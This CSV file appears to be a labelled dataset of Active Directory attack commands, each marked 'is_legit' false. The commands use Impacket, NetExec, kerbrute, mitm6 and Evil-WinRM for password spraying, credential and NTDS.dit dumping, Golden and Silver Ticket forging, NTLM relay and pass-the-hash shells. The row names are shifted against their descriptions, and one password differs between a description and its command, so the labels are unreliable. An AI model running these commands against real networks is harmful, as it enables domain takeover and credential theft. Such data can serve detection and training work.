"Name","description","command","items","OS","attack_types","references","services","is_legit"
"NetExec-Enum-SMB-Relay-List","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will enumerate the SMB host using anonymous access.   Command Reference:  	Target IP: 10.10.10.1","nxc smb 10.10.10.1 -u 'a' -p ''","No_Creds","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-Enum-SMB-Null","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will enumerate domain groups, local groups, users, user descriptions, users trusted for delegation, users without a password, You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","nxc ldap 10.10.10.1 -u 'john' -p 'password123' --trusted-for-delegation  --password-not-required --admin-count --users --groups","[''Username''-|-''Password'']","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","LDAP","false"
"NetExec-Enum-SMB-Anonymous","""NetExec (a.k.a nxc) is a network pentesting suite that has many modules that can be listed via nxc <protocol> -L. The coerece_plus module will enumarate a target ip, dnsname, list of targets or ip range for different coherence attacks. It will indicate in the output which a target is vulnrable to. Providing you also a means for exploit by adding where your listener/reciving system is(-LISTENER=10.10.10.1) and which exploit you want it to use. The module was recently updated 7 days ago to work on the latest windows build""    Command Reference:        Target IP: 10.10.10.1        Username: john        Password: password123","nxc smb 10.10.10.1 -u john -p password123 -M coerce_plus","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","[''Enumeration''-|-''Privilidge Escalation''-|-''Exploitation''-|-''Laterl movement'']","[''https://blog.redteam-pentesting.de/2025/windows-coercion/''-|-''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities'']","SMB","false"
"NetExec-Enum-LDAP","mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. The following command will respond to DHCPv6 messages and set the DNS server to the attack host IP. Leverage this command with ntlmrelayx.py to capture the WPAD configuration requests.   Command Reference:  	Domain: test.local","mitm6 -d test.local --ignore-nofqnd","No_Creds","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/dirkjanm/mitm6''-|-''https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/'']","DNS","false"
"NetExec-Creds-coerce_plus","ldapsearch is a Linux based tool that opens a connection to an LDAP server, binds, and performs a search using specified parameters. The following command will attempt to find sensitive information (such as leaked creds), by querying all LDAP objects, essentially dumping all the data that an anonymous user can access.  Command Reference:  	Domain: test.local","ldapsearch -LLL -x -H ldap://test.local -b'' -s base '(objectclass=\*)'","No_Creds","Linux","Enumeration","https://linux.die.net/man/1/ldapsearch","LDAP","false"
"Mitm6","ldapsearch is a Linux based tool that opens a connection to an LDAP server, binds, and performs a search using specified parameters. The following command will attempt to find sensitive information (such as leaked creds), by querying all LDAP objects, essentially dumping all the data that an anonymous user can access.  Command Reference:  	Domain: test.local    	Username: ldap    	Password: password123","ldapsearch -h test.local -D 'ldap@test.local' -w password123 -b 'dc=test,dc=local'","[''Username''-|-''Password'']","Linux","Enumeration","https://linux.die.net/man/1/ldapsearch","LDAP","false"
"LDAPSearch-NoCreds","ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to enumerate valid usernames given a list of usernames to try.  Command Reference:  	Domain: test.local  	Username List: usernames.txt","kerbrute userenum -d test.local usernames.txt","No_Creds","[''Linux''-|-''Windows'']","Enumeration","https://github.com/ropnop/kerbrute","Kerberos","false"
"LDAPSearch-Creds","ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will perform a password spray account against a list of provided users given a password.  Command Reference:  	Domain: test.local  	Username List: domain_users.txt  	Password: password123","kerbrute passwordspray -d test.local domain_users.txt password123","Username","[''Linux''-|-''Windows'']","Enumeration","https://github.com/ropnop/kerbrute","Kerberos","false"
"Kerbrute-UserEnum","ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will bruteforce an account against a list of provided passwords given a username.  Command Reference:  	Domain: test.local  	Password List: passwords.txt  	Username: john","kerbrute bruteuser -d test.local passwords.txt john","Username","[''Linux''-|-''Windows'']","Enumeration","https://github.com/ropnop/kerbrute","Kerberos","false"
"Kerbrute-PasswordSpray","ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to brute force valid username and passwords logins given a list of credentials (in the format `username:password`).  Command Reference:  	Domain: test.local  	Credential List: credentials.txt","cat credentials.txt | kerbrute_linux_amd64 -d test.local bruteforce -","No_Creds","Linux","Enumeration","https://github.com/ropnop/kerbrute","Kerberos","false"
"Kerbrute-BruteUser","Impacket's getTGT.py uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7","python3 getTGT.py test.local/john -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7","[''Hash''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py''-|-''https://www.tarlogic.com/en/blog/how-to-attack-kerberos/'']","Kerberos","false"
"Kerbrute-BruteForce","Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account using the hashed password of user `john` and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Service: www  	Host Name: server01.test.local  	Username: john  	Hash: :2a3de7fe356ee524cc9f3d579f2e0aa7  	Impersonated User: Administrator","python3 getST.py -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7 -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john","[''Hash''-|-''Username'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py''-|-''http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html'']","Kerberos","false"
"Impacket-getTGT","Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Service: www  	Host Name: server01.test.local  	Username: john  	Password: password123  	Impersonated User: Administrator","python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py''-|-''http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html'']","Kerberos","false"
"Impacket-getST-Hash","Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute the given command. It will create a windows task with a random name, trigger the task, and then delete it. The following command executes `whoami` on the remote Windows host, authenticating with the hash of user `john`.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76  	Command Executed: whoami","python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami","[''Hash''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py''-|-''https://u0041.co/blog/post/1'']","SMB","false"
"Impacket-getST-Creds","Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute the given command. It will create a windows task with a random name, trigger the task, and then delete it. The following command executes `whoami` on the remote Windows host.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123  	Command Executed: whoami","python3 atexec.py test.local/john:password123@10.10.10.1 whoami","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py''-|-''https://u0041.co/blog/post/1'']","SMB","false"
"Impacket-atexec-Hash","Impacket's addcomputer.py will add a computer account to the domain and set its password. The following command will create a new computer over the SMB by specifying the `SAMR` method.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	New Computer Password: TestPassword123  	New Computer Name: testComputer  	Username: john  	Password: password123","python3 addcomputer.py -method SAMR -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py''-|-''http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html'']","SMB","false"
"Impacket-atexec-Creds","Impacket's addcomputer.py will add a computer account to the domain and set its password. The following command will create a new computer over LDAPS. Plain LDAP is not supported, as it doesn't allow setting the password of the new computer.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	New Computer Password: TestPassword123  	New Computer Name: testComputer  	Username: john  	Password: password123","python3 addcomputer.py -method LDAPS -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py''-|-''http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html'']","LDAP","false"
"Impacket-addcomputer-SMB","Impacket's wmiexec.py uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 wmiexec.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py''-|-''https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy'']","WMI","false"
"Impacket-addcomputer-LDAPS","Impacket's ticketer.py can perform Silver Ticket attacks, which crafts a valid TGS ticket for a specific service using a valid user's NTLM hash. It is then possible to gain access to that service. The following command crafts a TGS for the SMB service, which can then be used to gain a shell.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: b18b4b218eccad1c223306ea1916885f  	Domain SID: S-1-5-21-1339291983-1349129144-367733775  	SMB Service: cifs","python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john","[''Username''-|-''Hash'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py''-|-''https://www.tarlogic.com/en/blog/how-to-attack-kerberos/'']","Kerberos","false"
"Impacket-WMIExec","Impacket's services.py communicates with Windows services using the MSRPC interface. It can perform many different actions on any service.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123  	Action: list","python3 services.py test.local/john:password123@10.10.10.1 list","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/services.py''-|-''https://www.hackingarticles.in/impacket-guide-smb-msrpc/'']","RPC","false"
"Impacket-SilverTicket","Impacket's secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit. The following command will attempt to dump all secrets from the target machine using the previously mentioned techniques.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 secretsdump.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py''-|-''https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy'']","[''Kerberos''-|-''NTLM'']","false"
"Impacket-Services","Impacket's secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit. The following command will attempt to use the specified machines NTDS.dit and system file to extract the user account hashes associated with that machine.  Command Reference:  	Target IP: 10.10.10.2  	Domain Controller: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.1 test.local/john:password123@10.10.10.2","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py''-|-''https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy'']","[''Kerberos''-|-''NTLM'']","false"
"Impacket-SecretsDump","Impacket's smbexec.py. This will give you an interactive shell on the Windows host.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 smbexec.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py''-|-''https://www.varonis.com/blog/insider-danger-stealthy-password-hacking-with-smbexec/'']","SMB","false"
"Impacket-SecretsDump-NTDS","Impacket's smbclient.py is a generic smbclient, allowing you to list shares and files, rename, upload and download files and create and delete directories.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 smbclient.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py''-|-''https://www.hackingarticles.in/impacket-guide-smb-msrpc/'']","SMB","false"
"Impacket-SMBExec","Impacket's samrdump.py communicates with the Security Account Manager Remote (SAMR) interface to list system user accounts, available resource shares, and other sensitive information.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 samrdump.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py''-|-''https://www.hackingarticles.in/impacket-guide-smb-msrpc/'']","RPC","false"
"Impacket-SMBClient","Impacket's reg.py is a remote registry manipulation tool, providing similar functionality to reg.exe in Windows.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 reg.py test.local/john:password123@10.10.10.1 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/reg.py''-|-''https://www.hackingarticles.in/impacket-guide-smb-msrpc/'']","SMB","false"
"Impacket-SAMRDump","Impacket's rpcdump.py enumerates Remote Procedure Call (RPC) endpoints.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 rpcdump.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py''-|-''https://www.hackingarticles.in/impacket-guide-smb-msrpc/'']","RPC","false"
"Impacket-Reg","Impacket rbcd.py will modify the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer with security descriptor of another computer. The following command adds the related security descriptor of the created EVILCOMPUTER to the msDS-AllowedToActOnBehalfOfOtherIdentity property of DC01. This basically means that EVILCOMPUTER can get impersonated service tickets for DC01 using getST.py.  Command Reference:    Target IP: 10.10.10.1    Domain: test.local    Username: john    Hash: :A9FDFA038C4B75EBC76DC855DD74F0DA    Delegate To: DC01$    Delegate From: EVILCOMPUTER$","python3 rbcd.py -action write -delegate-to ""DC01$"" -delegate-from ""EVILCOMPUTER$"" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john","[''Username''-|-''Hash'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py''-|-''https://github.com/tothi/rbcd-attack'']","[''Kerberos''-|-''SMB''-|-''LDAP'']","false"
"Impacket-RPCDump","Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 psexec.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py''-|-''https://www.sans.org/blog/psexec-python-rocks/'']","SMB","false"
"Impacket-RBCD","Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. psexec.py also allows using Service Tickets, saved as a ccache file for Authentication. It can be obtained via Impacket's GetST.py  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john","export KRB5CCNAME=/full/path/to/john.ccache; python3 psexec.py test.local/john@10.10.10.1 -k -no-pass","[''TGS''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py''-|-''https://www.sans.org/blog/psexec-python-rocks/''-|-''https://book.hacktricks.xyz/windows/active-directory-methodology/pass-the-ticket#pass-the-ticket-attack'']","SMB","false"
"Impacket-PsExec","Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).  The below command creates an SMB relay server that targets the IP 10.10.10.1, meaning any credentials that the SMB server recieves, gets relayed to that IP to attempt to authenticate and execute 'whoami /all'. In order for the SMB server to recieve credentials to relay, dementor.py can be used to trigger a forced authentication from the IP it's targeting to an attacker controlled SMB server.  Command Reference:  	Target IP: 10.10.10.1","python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug","No_Creds","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py''-|-''https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack'']","NTLM","false"
"Impacket-PsExec-PassTheTicket","Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).  The below command will perform WPAD spoofing to force the victim machine to authenticate to the attacker controlled host. The command will then relay the authentication to create a new computer object and grant it delegation rights to impersonate users on the victim machine. This command should be used in conjunction with mitm6.  Command Reference:  	Target Domain Controller: dc.test.local","python3 ntlmrelayx.py -t ldaps://dc.test.local -wh test-wpad --delegate-access","No_Creds","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py''-|-''https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/'']","[''NTLM''-|-''LDAP'']","false"
"Impacket-NTLMRelayX","Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).  The below command creates an SMB relay server that targets the IP 10.10.10.1, meaning any credentials that the SMB server recieves, gets relayed to that IP to attempt to authenticate and create a socks connection to the host. In order for the SMB server to recieve credentials to relay, dementor.py or Petitpotam can be used to trigger a forced authentication from the IP it's targeting to an attacker controlled SMB server.  Command Reference:  	Target IP: 10.10.10.1","python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -socks","No_Creds","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py''-|-''https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack'']","[''NTLM''-|-''SMB'']","false"
"Impacket-NTLMRelayX-WPAD","Impacket's lookupsid.py performs bruteforcing of Windows SID's to identify users/groups on the remote target.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 lookupsid.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py''-|-''https://www.puckiestyle.nl/impacket/'']","RPC","false"
"Impacket-NTLMRelayX-Socks","Impacket's ticketer.py can perform Golden Ticket attacks, which crafts a valid TGT ticket using a valid user's NTLM hash. It is then possible to access any service using the TGT by requesting a TGS for that service.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: b18b4b218eccad1c223306ea1916885f  	Domain SID: S-1-5-21-1339291983-1349129144-367733775","python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 john","[''Username''-|-''Hash'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py''-|-''https://www.tarlogic.com/en/blog/how-to-attack-kerberos/'']","Kerberos","false"
"Impacket-LookUpSID","Impacket's GetUserSPNs.py will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account's password, which can then be bruteforced offline.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py''-|-''https://www.tarlogic.com/en/blog/how-to-attack-kerberos/'']","Kerberos","false"
"Impacket-GoldenTicket","Impacket's GetNPUsers.py will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user's password, which can then be cracked offline.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username List: usernames.txt  	Output File: hashes.txt","python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt","Username","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py''-|-''https://www.tarlogic.com/en/blog/how-to-attack-kerberos/'']","Kerberos","false"
"Impacket-GetUserSPNs","Impacket's GetADUsers.py will attempt to gather data about the domain's users and their corresponding email addresses.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 GetADUsers.py -all test.local/john:password123 -dc-ip 10.10.10.1","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","Enumeration","https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py","Kerberos","false"
"Impacket-GetNPUsers","Python script to automatically extract and decrypt Group Policy Preferences (GPP) passwords using streams for carving files instead of mounting shares  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 Get-GPPPassword.py 'TEST.local/john:password123@DC01.TEST.local' -dc-ip 10.10.10.1","[''Password''-|-''Username''-|-''Hash'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Enumeration'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py''-|-''https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/'']","SMB","false"
"Impacket-GetADUsers","Impacket's dcomexec.py provides an interactive shell on the Windows host similar to wmiexec.py, but using varying DCOM endpoints.  Currently supports MMC20.Application, ShellWindows, and ShellBrowserWindow DCOM objects.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123  	DCOM Object: MMC20","python3 dcomexec.py -object MMC20 test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py''-|-''https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/'']","DCOM","false"
"Impacket-Get-GPPPassword","The script FindUncommonShares.py is a Python equivalent of PowerView's Invoke-ShareFinder.ps1 allowing to quickly find uncommon shares in vast Windows Domains.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","python3 FindUncommonShares.py -u 'john' -d 'TEST.local' -p 'password123' --dc-ip 10.10.10.1","[''Password''-|-''Username''-|-''Hash'']","[''Linux''-|-''Windows'']","Enumeration","https://github.com/p0dalirius/FindUncommonShares","SMB","false"
"Impacket-DCOMExec","Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host. Winrm Supports PKINIT, meaning if you have a computers PFX file, you can authenticate and get a shell. Note that the command requires a public and a private key in PEM format, that can be extracted by converting the PFX to PEM format. Take a look at the references for more info on that. Password protected PFX files can be cracked with JohnTheRipper.  Command Reference:  	Target IP: 10.10.10.1  	PFX File: cert.pfx  	Domain: EVILCORP","evil-winrm -i 10.10.10.1 -c pub.pem -k priv.pem -S -r EVILCORP","PFX","Windows","Exploitation","[''https://github.com/Hackplayers/evil-winrm''-|-''https://book.hacktricks.xyz/cryptography/certificates'']","WMI","false"
"FindUncommonShares","Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host.  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","evil-winrm -i 10.10.10.1 -u john -p password123","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","https://github.com/Hackplayers/evil-winrm","WMI","false"
"Evil-Winrm-PKINIT","Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host. Evil-WinRM supports passing the victim's NT hash for authorization.  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	NT Hash: c23b2e293fa0d312de6f59fd6d58eae3","evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3","[''Username''-|-''Hash'']","[''Linux''-|-''Windows'']","Exploitation","https://github.com/Hackplayers/evil-winrm","WMI","false"
"Evil-WinRM","Enum4Linux is a tool for enumerating information from Windows and Samba systems, using a number of different techniques. The following command will attempt to enumerate information using no credentials.  Command Reference:  	Target IP: 10.10.10.1","enum4linux -a 10.10.10.1","No_Creds","Linux","Enumeration","https://github.com/CiscoCXSecurity/enum4linux","","false"
"Evil-WinRM-PTH","Enum4Linux is a tool for enumerating information from Windows and Samba systems, using a number of different techniques. The following command will attempt to enumerate information provided valid login credentials.  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","enum4linux -u john -p password123 -a 10.10.10.1","[''Username''-|-''Password'']","Linux","Enumeration","https://github.com/CiscoCXSecurity/enum4linux","","false"
